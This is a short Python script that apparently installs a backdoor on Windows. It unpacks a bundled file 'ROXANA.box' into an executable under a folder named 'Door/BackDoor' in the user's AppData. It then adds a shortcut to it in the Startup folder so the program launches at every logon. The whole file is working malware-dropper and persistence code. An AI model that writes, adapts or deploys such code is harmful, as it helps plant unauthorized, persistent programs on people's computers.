
import os
# import winshell
from win32com.client import Dispatch



shortcut_location = os.path.expanduser('~') + r'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'
save_file = os.path.expanduser('~') + r'/AppData/Local/'

def creating_door():
    roxana = open('ROXANA.box', 'rb')
    byte = roxana.read()
    os.chdir(save_file)
    os.makedirs('Door/BackDoor')
    install_location = save_file + 'Door/BackDoor/'
    os.chdir(install_location)
    with open('ROXANA.exe', 'wb') as killer_roxana:
        killer_roxana.write(byte)
        killer_roxana.close()

    create_shortcut(install_location)

def create_shortcut(install_location):
    target = install_location + r'ROXANA.exe'
    path = os.path.join(shortcut_location + 'ROXANA.lnk')
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(path)
    # install_location = bytes(install_location)
    shortcut.Targetpath = target
    shortcut.WorkingDirectory = save_file
    shortcut.save()


# def main():
    # creating_door()


if __name__ == '__main__':
    creating_door()
